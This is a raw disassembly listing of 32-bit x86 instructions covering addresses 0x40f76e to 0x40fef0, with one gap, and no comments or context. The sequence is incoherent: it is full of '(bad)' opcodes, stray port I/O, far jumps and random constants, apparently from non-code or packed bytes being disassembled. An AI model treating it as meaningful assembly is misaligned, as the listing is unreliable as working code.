  40f76e:	pop    DWORD PTR [edx]
  40f770:	ret    0x2b25
  40f773:	inc    edx
  40f774:	xor    al,dh
  40f776:	adc    dl,BYTE PTR [eax+0x4dc3d5ba]
  40f77c:	and    BYTE PTR [edx+0x2be04fb],cl
  40f782:	imul   eax,DWORD PTR [esi+0x53],0xda39889c
  40f789:	add    eax,0xe140fff8
  40f78e:	mov    cl,0x6d
  40f790:	or     eax,0xfe34b600
  40f795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f796:	lods   al,BYTE PTR ds:[esi]
  40f797:	push   0xffffffaa
  40f799:	leave  
  40f79a:	fild   DWORD PTR [ecx]
  40f79c:	ret    
  40f79d:	in     al,0x5b
  40f79f:	repz sbb al,0x7e
  40f7a2:	xchg   ebx,eax
  40f7a3:	mov    bl,0x29
  40f7a5:	call   edx
  40f7a7:	rol    BYTE PTR [edi+0x17],1
  40f7aa:	dec    esp
  40f7ab:	sbb    dh,BYTE PTR [esi-0x3ab4f8ef]
  40f7b1:	mov    WORD PTR [eax+0x5d],fs
  40f7b4:	sbb    BYTE PTR [ecx+0x5b714215],dh
  40f7ba:	inc    esp
  40f7bb:	adc    BYTE PTR [eax+0x2f94d3ec],bh
  40f7c1:	popa   
  40f7c2:	cmp    al,0x2a
  40f7c4:	sbb    al,0xd9
  40f7c6:	sbb    BYTE PTR [ecx-0x1f],dl
  40f7c9:	stos   BYTE PTR es:[edi],al
  40f7ca:	retf   0xf2b
  40f7cd:	loopne 0x40f81e
  40f7cf:	imul   edi,DWORD PTR [esi],0x47
  40f7d2:	mov    esi,0x1749c43e
  40f7d7:	add    ch,cl
  40f7d9:	sub    eax,DWORD PTR [ecx]
  40f7db:	jb     0x40f836
  40f7dd:	jge    0x40f7c0
  40f7df:	pusha  
  40f7e0:	pop    es
  40f7e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7e2:	pusha  
  40f7e3:	neg    dl
  40f7e5:	js     0x40f7be
  40f7e7:	and    ebp,0xb187a579
  40f7ed:	scas   eax,DWORD PTR es:[edi]
  40f7ee:	mov    ds:0x990c6a93,eax
  40f7f3:	test   al,0xf3
  40f7f5:	xchg   edx,eax
  40f7f6:	or     eax,0x86a7e83c
  40f7fb:	push   ds
  40f7fc:	xchg   DWORD PTR ds:0x3754016a,esp
  40f802:	add    dh,ch
  40f804:	fidiv  DWORD PTR [edx]
  40f806:	mov    dl,0x7c
  40f808:	adc    DWORD PTR [esi],ebp
  40f80a:	aad    0x40
  40f80c:	pop    ebx
  40f80d:	jle    0x40f87e
  40f80f:	popa   
  40f810:	mov    dl,0x66
  40f812:	hlt    
  40f813:	xor    edx,0x16
  40f816:	outs   dx,DWORD PTR ds:[esi]
  40f817:	cmc    
  40f818:	add    al,0x8f
  40f81a:	xchg   edi,eax
  40f81b:	pop    ecx
  40f81c:	jne    0x40f7b0
  40f81e:	pop    edi
  40f81f:	imul   esp,edx,0xffffff85
  40f822:	and    al,0x50
  40f824:	(bad)  
  40f825:	pop    es
  40f826:	je     0x40f86c
  40f828:	pop    ss
  40f829:	mov    bh,0x6d
  40f82b:	fcmovnu st,st(7)
  40f82d:	push   esi
  40f82e:	and    al,0xa3
  40f830:	mov    ds:0xea9a46e5,eax
  40f835:	add    dl,BYTE PTR [esi+0x28]
  40f838:	cdq    
  40f839:	jmp    0x39b2:0x611b3134
  40f840:	inc    ebp
  40f841:	fwait
  40f842:	cwde   
  40f843:	inc    esp
  40f844:	push   es
  40f845:	int    0xe2
  40f847:	fld    TBYTE PTR [eax]
  40f849:	test   eax,esi
  40f84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f84c:	popa   
  40f84d:	ins    DWORD PTR es:[edi],dx
  40f84e:	test   eax,0x1b20d156
  40f853:	sbb    esi,DWORD PTR [eax]
  40f855:	inc    ecx
  40f856:	lock sbb esp,DWORD PTR [eax+eiz*2-0x34]
  40f85b:	js     0x40f8d8
  40f85d:	pop    esi
  40f85e:	or     DWORD PTR [edi+0x50],0x6f
  40f862:	aaa    
  40f863:	jo     0x40f88b
  40f865:	jge    0x40f8a5
  40f867:	xor    ebx,ecx
  40f869:	pavgw  mm3,QWORD PTR [edx+0x2c]
  40f86d:	mov    edx,0xb197c47c
  40f872:	pop    eax
  40f873:	and    edi,DWORD PTR [edi-0x5cfca6b4]
  40f879:	push   ds
  40f87a:	aam    0x54
  40f87c:	aam    0x3a
  40f87e:	jns    0x40f82b
  40f880:	or     cl,BYTE PTR [edi+0x17]
  40f883:	in     al,dx
  40f884:	xor    dh,BYTE PTR [esi]
  40f886:	mov    ebp,0x89aa7dbb
  40f88b:	retf   0x7cbe
  40f88e:	jb     0x40f882
  40f890:	jg     0x40f823
  40f892:	push   ss
  40f893:	push   0xc
  40f895:	sahf   
  40f896:	fs mov esi,0x6b6d1e15
  40f89c:	inc    edi
  40f89d:	scas   eax,DWORD PTR es:[edi]
  40f89e:	je     0x40f90e
  40f8a0:	mov    al,ds:0xc8814bce
  40f8a5:	scas   al,BYTE PTR es:[edi]
  40f8a6:	in     eax,0x15
  40f8a8:	mov    ch,0x4f
  40f8aa:	in     al,dx
  40f8ab:	rol    DWORD PTR [edx+0x5d],cl
  40f8ae:	lods   al,BYTE PTR ds:[esi]
  40f8af:	inc    ebx
  40f8b0:	mov    edi,0x5e25e80f
  40f8b5:	fs xor al,0x2f
  40f8b8:	pushf  
  40f8b9:	loope  0x40f90a
  40f8bb:	fiadd  DWORD PTR [ebp-0x6e7d9228]
  40f8c1:	xchg   edi,eax
  40f8c2:	cmp    al,0x99
  40f8c4:	ficomp DWORD PTR [ebx]
  40f8c6:	es (bad) 
  40f8c8:	sar    DWORD PTR [ecx],0xf4
  40f8cb:	cmp    al,0x85
  40f8cd:	pop    ss
  40f8ce:	outs   dx,DWORD PTR ds:[esi]
  40f8cf:	sub    BYTE PTR [ebx],bh
  40f8d1:	stc    
  40f8d2:	lods   al,BYTE PTR ds:[esi]
  40f8d3:	jecxz  0x40f8d0
  40f8d5:	sub    BYTE PTR [esi+0x17],dh
  40f8d8:	sbb    DWORD PTR gs:[eax],edi
  40f8db:	outs   dx,BYTE PTR ds:[esi]
  40f8dc:	ds pop ecx
  40f8de:	inc    ebp
  40f8df:	xor    dl,BYTE PTR [ebp-0x80]
  40f8e2:	mov    esp,0xf1563a78
  40f8e7:	mov    dl,0x1e
  40f8e9:	daa    
  40f8ea:	fwait
  40f8eb:	daa    
  40f8ec:	cli    
  40f8ed:	or     BYTE PTR [edx],al
  40f8ef:	div    BYTE PTR [ebp+0x40]
  40f8f2:	jp     0x40f910
  40f8f4:	add    edi,DWORD PTR ds:0xa35ad317
  40f8fa:	call   0x4133:0x2c370ebe
  40f901:	ret    0x7c39
  40f904:	mov    cl,0x8d
  40f906:	pop    edx
  40f907:	outs   dx,DWORD PTR ds:[esi]
  40f908:	popa   
  40f909:	aam    0xb8
  40f90b:	out    dx,al
  40f90c:	shr    dh,cl
  40f90e:	mov    al,0x60
  40f910:	or     DWORD PTR [ebp-0x3d6630b9],ecx
  40f916:	cmp    cl,BYTE PTR [edx]
  40f918:	scas   eax,DWORD PTR es:[edi]
  40f919:	neg    BYTE PTR [edx+0x63b05a13]
  40f91f:	scas   al,BYTE PTR es:[edi]
  40f920:	mov    ebx,0xd7128155
  40f925:	mov    edi,ecx
  40f927:	cmp    BYTE PTR [edx+0x5282c63b],bh
  40f92d:	inc    edi
  40f92e:	dec    edi
  40f92f:	gs adc al,0xfb
  40f932:	xor    ch,cl
  40f934:	ret    0xb001
  40f937:	adc    ecx,DWORD PTR [edx]
  40f939:	ja     0x40f9b2
  40f93b:	lock add al,0xa9
  40f93e:	repnz or BYTE PTR [edx+0x349ae50c],0xb1
  40f946:	(bad)
  40f94a:	lods   eax,DWORD PTR ds:[esi]
  40f94b:	jecxz  0x40f8d3
  40f94d:	out    dx,al
  40f94e:	fdiv   QWORD PTR [ebx-0x4de1a1e0]
  40f954:	pop    esp
  40f955:	scas   al,BYTE PTR es:[edi]
  40f956:	push   0xbd22a4b4
  40f95b:	mov    al,ds:0x2fc51d91
  40f960:	or     DWORD PTR [ecx-0x2c0169a],0xffffff8d
  40f967:	pop    ecx
  40f968:	cmp    al,0x1d
  40f96a:	xchg   ecx,eax
  40f96b:	push   esi
  40f96c:	repnz loope 0x40f995
  40f96f:	arpl   bp,si
  40f971:	iret   
  40f972:	pop    ebx
  40f973:	or     eax,0x81b8856c
  40f978:	sub    DWORD PTR [ecx+0x36],edx
  40f97b:	(bad)  
  40f97c:	icebp  
  40f97d:	xchg   ebp,eax
  40f97e:	mov    ah,0x87
  40f980:	push   ds
  40f981:	mov    bl,ah
  40f983:	add    DWORD PTR [eax-0x34b5dbdb],edx
  40f989:	adc    al,0x81
  40f98b:	(bad)  
  40f98c:	lahf   
  40f98d:	pop    ecx
  40f98e:	in     al,0xcd
  40f990:	fadd   QWORD PTR [edi+ecx*4-0x647d5586]
  40f997:	les    ebx,FWORD PTR [ebp-0x25]
  40f99a:	add    eax,0xb3d116cc
  40f99f:	push   es
  40f9a0:	mov    DWORD PTR [eax-0x7c],ecx
  40f9a3:	sub    DWORD PTR ds:0xafaa10f6,edi
  40f9a9:	or     al,0xd8
  40f9ab:	sub    DWORD PTR [eax+0x3bae5cc5],ebx
  40f9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b2:	pop    edx
  40f9b3:	mov    ebp,0xf6f3e6c8
  40f9b8:	inc    esp
  40f9b9:	jb     0x40f9c1
  40f9bb:	jo     0x40f9ce
  40f9bd:	pusha  
  40f9be:	loopne 0x40f995
  40f9c0:	mov    edi,0x996d0b18
  40f9c5:	mov    dh,0x9b
  40f9c7:	mov    esi,0xa3d080c1
  40f9cc:	stos   BYTE PTR es:[edi],al
  40f9cd:	lahf   
  40f9ce:	pop    esp
  40f9cf:	addr16 add eax,0xba89e595
  40f9d5:	stos   BYTE PTR es:[edi],al
  40f9d6:	clc    
  40f9d7:	adc    esi,esp
  40f9d9:	scas   al,BYTE PTR es:[edi]
  40f9da:	add    eax,ebp
  40f9dc:	inc    eax
  40f9dd:	mov    WORD PTR [ebp+0x54],fs
  40f9e0:	cwde   
  40f9e1:	sbb    DWORD PTR [edi+0x25],0xdbfe52a8
  40f9e8:	aad    0x65
  40f9ea:	jp     0x40fa5c
  40f9ec:	jo     0x40f986
  40f9ee:	lock loope 0x40f9dd
  40f9f1:	frstor [edi-0x2467be48]
  40f9f7:	or     DWORD PTR [edi+esi*1+0x36785d1b],ebp
  40f9fe:	push   0x53
  40fa00:	in     al,0x9d
  40fa02:	dec    ebx
  40fa03:	mov    ds,WORD PTR [ebx+0x7e]
  40fa06:	rcr    DWORD PTR [eax-0x20],cl
  40fa09:	div    BYTE PTR [edi+0x1f]
  40fa0c:	sbb    al,0xe6
  40fa0e:	je     0x40f9d7
  40fa10:	cmp    bh,cl
  40fa12:	jge    0x40f9f0
  40fa14:	fimul  WORD PTR [esi+0x1e760ae2]
  40fa1a:	imul   edx,ecx,0xffffff92
  40fa1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa1e:	std    
  40fa1f:	xor    ebx,DWORD PTR [ecx-0x1b]
  40fa22:	aas    
  40fa23:	push   ecx
  40fa24:	mov    bl,0x33
  40fa26:	out    0xa1,eax
  40fa28:	push   es
  40fa29:	out    dx,al
  40fa2a:	outs   dx,BYTE PTR ds:[esi]
  40fa2b:	loopne 0x40fa3b
  40fa2d:	sbb    BYTE PTR cs:[eax+0xa7fea38],0x1e
  40fa35:	inc    ebp
  40fa36:	mov    al,ds:0x7c3a4a4d
  40fa3b:	cmc    
  40fa3c:	add    al,BYTE PTR [ebp+0x32]
  40fa3f:	sar    ebp,cl
  40fa41:	rcr    BYTE PTR [ebx+0x1d934d55],cl
  40fa47:	sti    
  40fa48:	cmp    DWORD PTR [edx+edx*8],0xffffffed
  40fa4c:	shl    DWORD PTR [ebx],cl
  40fa4e:	adc    eax,DWORD PTR [ebx]
  40fa50:	mov    ah,0x5d
  40fa52:	jge    0x40f9f0
  40fa54:	mov    eax,ds:0xa379c993
  40fa59:	pop    eax
  40fa5a:	jle    0x40fa1d
  40fa5c:	enter  0x7c61,0x5d
  40fa60:	push   0x48
  40fa62:	push   0x45
  40fa64:	and    edx,DWORD PTR [edx+0x6ba47a19]
  40fa6a:	aaa    
  40fa6b:	fimul  WORD PTR [ebx-0xb0877a8]
  40fa71:	sahf   
  40fa72:	in     eax,0x80
  40fa74:	into   
  40fa75:	ins    DWORD PTR es:[edi],dx
  40fa76:	inc    edi
  40fa77:	inc    edi
  40fa78:	loopne 0x40fa6d
  40fa7a:	fist   DWORD PTR [edi-0x4072a7d3]
  40fa80:	or     eax,0xe6ef21fc
  40fa85:	push   edi
  40fa86:	and    ch,bl
  40fa88:	adc    BYTE PTR [edi+0x7],dh
  40fa8b:	scas   eax,DWORD PTR es:[edi]
  40fa8c:	das    
  40fa8d:	shl    BYTE PTR [edx-0x64],cl
  40fa90:	push   ss
  40fa91:	mov    ebx,0x8c4e2630
  40fa96:	dec    esi
  40fa97:	xor    DWORD PTR [ebp-0x56],ebp
  40fa9a:	(bad)  
  40fa9b:	xchg   esi,eax
  40fa9c:	lds    ebp,FWORD PTR [esp+ecx*2]
  40fa9f:	adc    BYTE PTR [esi],0xe3
  40faa2:	push   ecx
  40faa3:	stc    
  40faa4:	jmp    0xbcc5:0x5ccbc451
  40faab:	retf   0x6ece
  40faae:	dec    esi
  40faaf:	clc    
  40fab0:	cmp    bh,BYTE PTR [esi]
  40fab2:	or     ah,ah
  40fab4:	xchg   edx,eax
  40fab5:	mov    esi,0xe301c40d
  40faba:	mov    ch,0x90
  40fabc:	jmp    0xe7b0:0x566e298c
  40fac3:	mov    eax,fs
  40fac5:	dec    ebx
  40fac6:	mov    ds:0xff86c55b,eax
  40facb:	mov    al,ch
  40facd:	add    al,0x1c
  40facf:	std    
  40fad0:	mov    bh,0xb9
  40fad2:	sbb    dh,BYTE PTR [ebx-0xc0a49c2]
  40fad8:	ror    DWORD PTR [ecx+0x4e3d27c0],1
  40fade:	cmp    al,0x86
  40fae0:	dec    esi
  40fae1:	xor    al,dh
  40fae3:	pop    eax
  40fae4:	sbb    eax,0xa1108b2f
  40fae9:	dec    edi
  40faea:	sub    dl,BYTE PTR [eax-0x44848a11]
  40faf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf1:	push   edx
  40faf2:	fst    QWORD PTR fs:[esi+0x215e4344]
  40faf9:	xchg   ebp,eax
  40fafa:	xchg   esi,eax
  40fafb:	fcomp  QWORD PTR [ecx]
  40fafd:	pop    ebp
  40fafe:	cdq    
  40faff:	adc    BYTE PTR [ebp-0x71],cl
  40fb02:	aaa    
  40fb03:	popa   
  40fb04:	fxch   st(7)
  40fb06:	rcl    BYTE PTR [edi-0x8],1
  40fb09:	popa   
  40fb0a:	(bad)  
  40fb0b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40fb0d:	pop    esi
  40fb0e:	ds xchg ebx,eax
  40fb10:	int3   
  40fb11:	push   eax
  40fb12:	inc    edx
  40fb13:	fisttp QWORD PTR [edi+0x4d]
  40fb16:	push   eax
  40fb17:	mov    cl,0xce
  40fb19:	imul   esi,DWORD PTR [esi-0x28a1d758],0x22da22fa
  40fb23:	mov    edi,0xa19e8563
  40fb28:	stos   DWORD PTR es:[edi],eax
  40fb29:	out    0x44,al
  40fb2b:	cli    
  40fb2c:	fwait
  40fb2d:	xchg   DWORD PTR [edx],esp
  40fb2f:	add    BYTE PTR fs:[ecx-0x7e],dl
  40fb33:	mov    ?,WORD PTR [edi-0x4e]
  40fb36:	into   
  40fb37:	xor    al,0xe8
  40fb39:	xor    edi,DWORD PTR [ecx+0x7d]
  40fb3c:	mov    ds:0xf389d2bd,eax
  40fb41:	and    ecx,DWORD PTR [edi-0x18]
  40fb44:	(bad)  
  40fb45:	cmp    eax,0xe5186e33
  40fb4a:	out    0xe9,al
  40fb4c:	jns    0x40fb41
  40fb4e:	jnp    0x40fb56
  40fb50:	nop
  40fb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb52:	xchg   esp,eax
  40fb53:	push   edi
  40fb54:	push   ebx
  40fb55:	sub    eax,0xcbf4a235
  40fb5a:	ficom  DWORD PTR [ebx+0x3a]
  40fb5d:	or     ebp,DWORD PTR [esi-0x7d6a8b0c]
  40fb63:	stos   BYTE PTR es:[edi],al
  40fb64:	imul   edi,DWORD PTR [edx-0x24],0x1757e518
  40fb6b:	mov    ds:0x4622e6d2,al
  40fb70:	mov    dh,0xc0
  40fb72:	fstp   QWORD PTR ds:0xc3364f7a
  40fb78:	ss retf 
  40fb7a:	in     eax,dx
  40fb7b:	inc    ecx
  40fb7c:	xchg   edi,eax
  40fb7d:	xor    eax,0x590dff7b
  40fb82:	xchg   esi,eax
  40fb83:	out    dx,eax
  40fb84:	jp     0x40fbe1
  40fb86:	push   ds
  40fb87:	pop    esp
  40fb88:	loopne 0x40fb5a
  40fb8a:	or     bl,BYTE PTR [ebp-0x2a]
  40fb8d:	loop   0x40fb34
  40fb8f:	and    BYTE PTR [edx-0x7a9ee1b3],dh
  40fb95:	jns    0x40fb53
  40fb97:	push   es
  40fb98:	out    0x33,eax
  40fb9a:	dec    edi
  40fb9b:	mov    WORD PTR [edx-0x5befff48],fs
  40fba1:	xchg   ecx,eax
  40fba2:	dec    edx
  40fba3:	and    BYTE PTR [ebx],dl
  40fba5:	and    DWORD PTR [edx+0x2a],ecx
  40fba8:	and    BYTE PTR [edx-0x1b],ch
  40fbab:	jno    0x40fb4a
  40fbad:	fidiv  DWORD PTR [edi-0x2b]
  40fbb0:	inc    ebx
  40fbb1:	int    0xde
  40fbb3:	bound  esi,QWORD PTR [eax-0x73]
  40fbb6:	mov    edx,DWORD PTR [edi]
  40fbb8:	repz sub BYTE PTR [esi-0x6a1b3ae5],ch
  40fbbf:	cmp    ch,ah
  40fbc1:	cmp    ebp,DWORD PTR [ecx+0x6f]
  40fbc4:	scas   al,BYTE PTR es:[edi]
  40fbc5:	sub    al,0xd0
  40fbc7:	cs out 0x53,al
  40fbca:	sub    BYTE PTR [ebx],0xe8
  40fbcd:	add    BYTE PTR [eax],dl
  40fbcf:	aaa    
  40fbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbd1:	xor    ebx,DWORD PTR [ebx]
  40fbd3:	dec    esp
  40fbd4:	inc    esp
  40fbd5:	fadd   QWORD PTR [ebx]
  40fbd7:	lds    edi,FWORD PTR [esi+ebp*8]
  40fbda:	pop    eax
  40fbdb:	dec    ebp
  40fbdc:	pop    edx
  40fbdd:	and    al,0x17
  40fbdf:	mov    eax,ds:0x43eb87c9
  40fbe4:	mov    DWORD PTR [edx+0x5fb1c266],ecx
  40fbea:	loope  0x40fba4
  40fbec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbed:	mov    ch,0x6
  40fbef:	xlat   BYTE PTR ds:[ebx]
  40fbf0:	test   bl,bl
  40fbf2:	mov    ecx,0x7beb4b54
  40fbf7:	ds (bad) 
  40fbf9:	dec    ebp
  40fbfa:	(bad)  
  40fbfb:	mov    ds:0x4e416ff1,eax
  40fc00:	repnz sub dl,bl
  40fc03:	repz xchg ecx,eax
  40fc05:	xchg   ebp,eax
  40fc06:	ret    
  40fc07:	push   0xe
  40fc09:	push   0xd
  40fc0b:	pop    ebx
  40fc0c:	ins    BYTE PTR es:[edi],dx
  40fc0d:	pop    ss
  40fc0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0f:	in     eax,0x26
  40fc11:	iret   
  40fc12:	pushf  
  40fc13:	aam    0xbf
  40fc15:	dec    ebx
  40fc16:	mov    WORD PTR [edi],es
  40fc18:	adc    ebp,eax
  40fc1a:	sbb    edx,eax
  40fc1c:	lds    edi,FWORD PTR [ebx-0x80]
  40fc1f:	shr    DWORD PTR [eax],0xe8
  40fc22:	pop    eax
  40fc23:	cmp    esi,esi
  40fc25:	iret   
  40fc26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc27:	(bad)  [esi-0x2d6c9c]
  40fc2d:	mov    esi,0x548d9414
  40fc32:	into   
  40fc33:	fst    QWORD PTR [eax]
  40fc35:	pop    edi
  40fc36:	ds int 0xab
  40fc39:	sub    al,0x3c
  40fc3b:	mov    esi,0x5fcd71b1
  40fc40:	test   BYTE PTR [ebp-0x44b432c5],dl
  40fc46:	stos   BYTE PTR es:[edi],al
  40fc47:	pusha  
  40fc48:	push   ss
  40fc49:	pop    ebp
  40fc4a:	paddusb mm4,mm7
  40fc4d:	clc    
  40fc4e:	ins    BYTE PTR es:[edi],dx
  40fc4f:	mov    ebx,fs
  40fc51:	dec    eax
  40fc52:	sahf   
  40fc53:	aad    0x1b
  40fc55:	sbb    al,al
  40fc57:	mov    edx,0x232484bb
  40fc5c:	push   ss
  40fc5d:	test   BYTE PTR [eax-0x2],bh
  40fc60:	ret    
  40fc61:	pop    eax
  40fc62:	aas    
  40fc63:	bound  eax,QWORD PTR [edx-0x6fc0e2cf]
  40fc69:	sub    eax,DWORD PTR [esi-0x1308b335]
  40fc6f:	out    dx,eax
  40fc70:	cs mov bl,0x35
  40fc73:	(bad)  
  40fc74:	je     0x40fcae
  40fc76:	or     esi,DWORD PTR [ecx-0x27]
  40fc79:	xor    edx,esi
  40fc7b:	out    0x77,al
  40fc7d:	stc    
  40fc7e:	fcomp  QWORD PTR [edx-0x9]
  40fc81:	jae    0x40fc8c
  40fc83:	or     ah,dh
  40fc85:	sub    eax,0xeb665512
  40fc8a:	mov    bl,0xe1
  40fc8c:	daa    
  40fc8d:	pop    ds
  40fc8e:	mov    dl,0xef
  40fc90:	int    0xc8
  40fc92:	outs   dx,BYTE PTR ds:[esi]
  40fc93:	inc    edi
  40fc94:	(bad)  
  40fc95:	dec    ebp
  40fc96:	fiadd  DWORD PTR [eax]
	...
  40fd14:	fdiv   QWORD PTR [ecx]
  40fd16:	mov    eax,0xfedbfd5a
  40fd1b:	mov    bh,0xdd
  40fd1d:	xchg   edx,eax
  40fd1e:	iret   
  40fd1f:	mov    DWORD PTR [esi-0x1346f73d],ebx
  40fd25:	test   al,0x0
  40fd27:	add    BYTE PTR [ebx+0x7],ch
  40fd2a:	add    BYTE PTR [eax],al
  40fd2c:	jb     0x40fd77
  40fd2e:	mov    ch,0x99
  40fd30:	dec    esi
  40fd31:	and    al,0x6c
  40fd33:	inc    edx
  40fd34:	fisub  WORD PTR [edi]
  40fd36:	jno    0x40fdb6
  40fd38:	dec    esp
  40fd39:	dec    ebx
  40fd3a:	sbb    BYTE PTR [esi],cl
  40fd3c:	mov    esi,0x862d9725
  40fd41:	add    bl,BYTE PTR [eax]
  40fd43:	mov    dh,0x3a
  40fd45:	test   al,0x69
  40fd47:	sub    DWORD PTR [edi-0x24bbc36b],edx
  40fd4d:	scas   eax,DWORD PTR es:[edi]
  40fd4e:	sahf   
  40fd4f:	in     al,dx
  40fd50:	test   eax,0x9cc2027e
  40fd55:	shl    BYTE PTR fs:[ecx],1
  40fd58:	add    DWORD PTR [edi+0x6785960],ecx
  40fd5e:	(bad)  
  40fd5f:	(bad)  
  40fd60:	jg     0x40fdc1
  40fd62:	mov    ds:0x4d4c1d24,eax
  40fd67:	sub    eax,0x62b86dee
  40fd6c:	or     eax,DWORD PTR [esi]
  40fd6e:	mov    ah,0x30
  40fd70:	mov    DWORD PTR fs:[edi],eax
  40fd73:	mov    esi,0xa84370c
  40fd78:	(bad)  
  40fd7a:	retf   
  40fd7b:	ds jle 0x40fdd1
  40fd7e:	leave  
  40fd7f:	xor    ebx,eax
  40fd81:	dec    esi
  40fd82:	nop
  40fd83:	(bad)
  40fd86:	or     DWORD PTR [ebp-0x37],ecx
  40fd89:	aam    0xc0
  40fd8b:	xor    eax,0xca4c1956
  40fd90:	or     DWORD PTR [ecx+edx*8-0x34f24329],eax
  40fd97:	inc    ecx
  40fd98:	jne    0x40fdba
  40fd9a:	scas   eax,DWORD PTR es:[edi]
  40fd9b:	int3   
  40fd9c:	pusha  
  40fd9d:	jno    0x40fdc0
  40fd9f:	lds    ecx,FWORD PTR [edi-0x80]
  40fda2:	lods   al,BYTE PTR ds:[esi]
  40fda3:	(bad)  
  40fda4:	(bad)  
  40fda5:	les    edi,FWORD PTR [edi+0x10571752]
  40fdab:	push   esi
  40fdac:	or     DWORD PTR [ebx+0x6307ac66],ebx
  40fdb2:	sbb    ebp,DWORD PTR ds:0xdfdbf4a
  40fdb8:	pop    edi
  40fdb9:	inc    esp
  40fdba:	adc    bh,BYTE PTR [ecx-0x53]
  40fdbd:	inc    edi
  40fdbe:	cmp    cl,al
  40fdc0:	je     0x40fd58
  40fdc2:	push   eax
  40fdc3:	jns    0x40fe2f
  40fdc5:	cmc    
  40fdc6:	les    ecx,FWORD PTR [edx+0xa]
  40fdc9:	daa    
  40fdca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdcb:	xlat   BYTE PTR ds:[ebx]
  40fdcc:	fwait
  40fdcd:	in     al,dx
  40fdce:	dec    ecx
  40fdcf:	add    edi,DWORD PTR [ebx+0x5b]
  40fdd2:	mov    esi,0x6f594830
  40fdd7:	mov    edx,0xeb676375
  40fddc:	icebp  
  40fddd:	cmc    
  40fdde:	sub    al,0xd5
  40fde0:	lahf   
  40fde1:	cmp    BYTE PTR [eax+edx*4-0x42cf23db],dl
  40fde8:	mov    dh,0xe5
  40fdea:	lods   eax,DWORD PTR ds:[esi]
  40fdeb:	into   
  40fdec:	pop    edx
  40fded:	aaa    
  40fdee:	push   eax
  40fdef:	xchg   BYTE PTR [ecx-0x69],cl
  40fdf2:	call   FWORD PTR [esi-0x64]
  40fdf5:	pop    ebp
  40fdf6:	jg     0x40fd8c
  40fdf8:	xor    al,0xeb
  40fdfa:	sbb    al,0x19
  40fdfc:	jecxz  0x40fd89
  40fdfe:	sbb    ecx,DWORD PTR [esp+ebx*8]
  40fe01:	mov    esi,0x2b2a8005
  40fe06:	inc    ebp
  40fe07:	pop    ss
  40fe08:	fnstsw WORD PTR ds:0x6c03227d
  40fe0e:	push   es
  40fe0f:	int    0xc9
  40fe11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe12:	add    DWORD PTR [ecx+0x24],ebx
  40fe15:	xchg   ebx,eax
  40fe16:	xchg   edi,eax
  40fe17:	xor    al,0xfd
  40fe19:	xlat   BYTE PTR ds:[ebx]
  40fe1a:	les    esp,FWORD PTR [ecx+0xec5fe6b]
  40fe20:	(bad)  
  40fe22:	mov    cl,0x74
  40fe24:	dec    ebx
  40fe25:	leave  
  40fe26:	adc    DWORD PTR [eax],ebp
  40fe28:	add    ebp,edx
  40fe2a:	nop
  40fe2b:	nop
  40fe2c:	mov    edx,DWORD PTR [esi+0x1b71092e]
  40fe32:	push   edi
  40fe33:	sbb    ebp,DWORD PTR [edx+eiz*4-0x156c8771]
  40fe3a:	mov    al,ds:0x532846c
  40fe3f:	retf   0x9b73
  40fe42:	pop    ecx
  40fe43:	fstp   QWORD PTR cs:[eax+0x3a3e9c8b]
  40fe4a:	es das 
  40fe4c:	lods   eax,DWORD PTR ds:[esi]
  40fe4d:	scas   al,BYTE PTR es:[edi]
  40fe4e:	je     0x40fe5d
  40fe50:	cld    
  40fe51:	jno    0x8ff999df
  40fe57:	and    al,0x53
  40fe59:	les    ebp,FWORD PTR [ebx-0x29b91cd3]
  40fe5f:	call   0x3d624675
  40fe64:	(bad)  
  40fe66:	aas    
  40fe67:	xor    BYTE PTR [edi+0x36],bh
  40fe6a:	jecxz  0x40fed2
  40fe6c:	call   0x3c28:0x67898566
  40fe73:	xchg   ebx,eax
  40fe74:	jl     0x40fe14
  40fe76:	inc    ebx
  40fe77:	lods   eax,DWORD PTR ds:[esi]
  40fe78:	inc    ecx
  40fe79:	imul   ecx,DWORD PTR [edi],0x2e
  40fe7c:	xor    bl,0x45
  40fe7f:	mov    WORD PTR [ebx-0x4514d9a6],gs
  40fe85:	push   ds
  40fe86:	dec    edi
  40fe87:	push   cs
  40fe88:	call   0x91f8:0xd1ec204d
  40fe8f:	inc    ecx
  40fe90:	push   ebp
  40fe91:	pop    esp
  40fe92:	in     eax,dx
  40fe93:	stos   DWORD PTR es:[edi],eax
  40fe94:	cmp    al,cl
  40fe96:	jns    0x40feea
  40fe98:	ret    0xbe68
  40fe9b:	sub    eax,0x77bdd82e
  40fea0:	pop    edx
  40fea1:	or     DWORD PTR [edi],ebp
  40fea3:	pop    edx
  40fea4:	mov    ss,edx
  40fea6:	rol    DWORD PTR [ebx+0x3453c269],1
  40feac:	jmp    0x693e:0x705581fb
  40feb3:	jae    0x40fe5b
  40feb5:	mov    esp,0x2228e756
  40feba:	fucomip st,st(0)
  40febc:	int3   
  40febd:	mov    ds:0x34265b17,al
  40fec2:	mov    DWORD PTR [edi-0x15],ecx
  40fec5:	fldcw  WORD PTR [ebp+0x7a]
  40fec8:	lods   al,BYTE PTR ds:[esi]
  40fec9:	ret    0xcc64
  40fecc:	bnd jbe 0x40fe89
  40fecf:	push   esi
  40fed0:	mov    dl,0xd9
  40fed2:	ins    DWORD PTR es:[edi],dx
  40fed3:	and    DWORD PTR [esi+eax*8+0x6eb4c7a1],edx
  40feda:	mov    ch,0xf8
  40fedc:	mov    bl,dh
  40fede:	jnp    0x40febb
  40fee0:	pop    ds
  40fee1:	mov    ecx,0xff07cb71
  40fee6:	pop    ebx
  40fee7:	jmp    DWORD PTR [ebx+0x52a5db6]
  40feed:	into   
  40feee:	jp     0x40fec2
  40fef0:	push   ebx
